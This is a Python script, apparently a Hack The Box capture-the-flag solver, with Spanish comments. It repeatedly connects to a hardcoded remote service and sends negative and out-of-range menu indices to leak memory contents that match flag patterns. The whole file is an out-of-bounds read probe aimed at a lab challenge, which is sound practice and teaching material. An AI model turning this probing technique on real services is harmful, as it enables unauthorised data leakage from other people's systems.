#!/usr/bin/env python3

import socket
import time
import sys

def connect_remote():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect(('94.237.57.211', 45459))
    return s

def test_index_range(start, end):
    """Prueba un rango de índices para ver si alguno revela información útil"""
    
    for index in range(start, end):
        try:
            s = connect_remote()
            
            # Recibir menú
            data = s.recv(4096)
            
            # Enviar índice
            s.send(f"{index}\n".encode())
            
            # Recibir respuesta
            data = s.recv(4096).decode()
            
            if "You've chosen:" in data:
                lines = data.split('\n')
                for line in lines:
                    if "You've chosen:" in line:
                        chosen = line.split("You've chosen:")[1].strip()
                        if chosen and len(chosen) > 0:
                            # Buscar patrones de flag
                            if any(pattern in chosen.lower() for pattern in ['htb', 'flag', '{', '}', 'ctf']):
                                print(f"*** POSIBLE FLAG EN ÍNDICE {index}: '{chosen}' ***")
                                return chosen
                            elif len(chosen) > 10:  # String interesante
                                print(f"Índice {index}: '{chosen[:50]}{'...' if len(chosen) > 50 else ''}'")
            
            s.close()
            time.sleep(0.1)
            
        except Exception as e:
            print(f"Error con índice {index}: {e}")
            continue
    
    return None

def search_negative_indices():
    """Busca en índices negativos que podrían apuntar a direcciones interesantes"""
    print("Buscando en índices negativos...")
    
    # Probar algunos índices negativos específicos
    interesting_negatives = [-1, -2, -3, -4, -5, -10, -16, -32, -64, -128, -256]
    
    for index in interesting_negatives:
        try:
            s = connect_remote()
            data = s.recv(4096)
            s.send(f"{index}\ntest\n".encode())
            data = s.recv(4096).decode()
            
            if "You've chosen:" in data:
                lines = data.split('\n')
                for line in lines:
                    if "You've chosen:" in line:
                        chosen = line.split("You've chosen:")[1].strip()
                        if chosen:
                            print(f"Índice {index}: '{chosen}'")
                            if any(pattern in chosen.lower() for pattern in ['htb', 'flag', '{', '}']):
                                print(f"*** POSIBLE FLAG: {chosen} ***")
                                return chosen
            
            s.close()
            time.sleep(0.1)
            
        except Exception as e:
            continue
    
    return None

if __name__ == "__main__":
    print("Buscando la flag en diferentes índices de memoria...")
    
    # Buscar en índices negativos
    result = search_negative_indices()
    if result:
        print(f"Flag encontrada: {result}")
        sys.exit(0)
    
    # Buscar en rangos específicos
    ranges_to_test = [
        (10, 50),
        (50, 100), 
        (100, 200),
        (200, 500),
        (1000, 1100),
        (2000, 2100)
    ]
    
    for start, end in ranges_to_test:
        print(f"Probando rango {start}-{end}...")
        result = test_index_range(start, end)
        if result:
            print(f"Flag encontrada: {result}")
            break
        time.sleep(1)  # Pausa entre rangos